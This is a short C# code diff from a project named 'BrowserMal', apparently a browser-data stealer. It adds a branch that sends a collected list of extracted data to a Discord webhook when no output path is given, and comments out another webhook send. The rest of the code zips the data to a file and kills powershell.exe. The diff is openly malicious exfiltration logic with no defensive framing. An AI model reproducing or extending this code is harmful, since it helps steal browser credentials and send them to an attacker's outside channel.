@@ -25,6 +25,12 @@ namespace BrowserMal
 
             Extration();
 
+            if (string.IsNullOrEmpty(output))
+            {
+                Discord.Webhook.BulkSend(list);
+                return;
+            }
+
             Filesaver.FileManager.SaveBytes(output, Zip.ZipArchives(list));
             ProcessUtil.KillProcessDelayed(1, "powershell.exe");
         }
@@ -35,7 +41,7 @@ namespace BrowserMal
 
             if (string.IsNullOrEmpty(root))
             {
-                Discord.Webhook.BulkSend(list);
+                //Discord.Webhook.BulkSend(list);
                 return;
             }
 
